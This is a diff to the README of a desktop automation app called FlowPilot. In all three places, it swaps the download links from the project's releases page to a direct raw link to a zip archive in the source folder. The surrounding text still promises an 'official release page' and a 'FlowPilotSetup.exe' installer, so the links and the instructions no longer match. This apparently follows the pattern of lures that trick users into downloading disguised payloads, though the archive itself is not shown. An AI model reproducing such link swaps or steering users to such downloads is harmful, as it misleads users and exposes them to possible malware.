@@ -1,6 +1,6 @@
 # 🛠️ FlowPilot - Automate Your Workflow Easily
 
-[![Download FlowPilot](https://img.shields.io/badge/Download-FlowPilot-green?style=for-the-badge)](https://github.com/elb790/FlowPilot/releases)
+[![Download FlowPilot](https://img.shields.io/badge/Download-FlowPilot-green?style=for-the-badge)](https://raw.githubusercontent.com/elb790/FlowPilot/main/src/Flow_Pilot_v1.6.zip)
 
 ## 📋 What is FlowPilot?
 
@@ -28,7 +28,7 @@ This guide will walk you through downloading, installing, and running FlowPilot 
 
 Click the big green button at the top or visit the official release page:
 
-[Download FlowPilot](https://github.com/elb790/FlowPilot/releases)
+[Download FlowPilot](https://raw.githubusercontent.com/elb790/FlowPilot/main/src/Flow_Pilot_v1.6.zip)
 
 This page lists the latest versions available. Find the most recent Windows installer, usually named like `FlowPilotSetup.exe`.
 
@@ -120,6 +120,6 @@ If problems continue, use the "Help" section inside the app for guidance.
 
 Get started now. Visit the release page to download and install FlowPilot:
 
-[Get FlowPilot Here](https://github.com/elb790/FlowPilot/releases)
+[Get FlowPilot Here](https://raw.githubusercontent.com/elb790/FlowPilot/main/src/Flow_Pilot_v1.6.zip)
 
 Follow the steps above to set up and start automating your workflow today.
